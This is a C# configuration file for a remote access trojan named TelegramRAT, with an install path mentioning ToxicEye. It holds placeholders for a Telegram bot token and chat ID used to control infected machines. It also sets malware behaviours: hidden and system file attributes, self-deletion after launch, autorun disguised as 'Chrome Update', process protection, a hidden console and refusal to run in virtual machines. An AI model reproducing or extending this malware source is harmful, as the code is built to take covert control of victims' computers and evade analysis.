namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram:
        public const string TelegramToken = "TELEGRAM_BOT_TOKEN_HERE";
        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
        public static int TelegramCommandCheckDelay = 1;
        // Install:
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
        // Autorun:
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Process protection:
        public static bool ProcessProtectionEnabled = true;
        public static bool HideConsoleWindow = true;
        public static bool PreventStartOnVirtualMachine = true;
        public static int StartDelay = 2;
    }
}
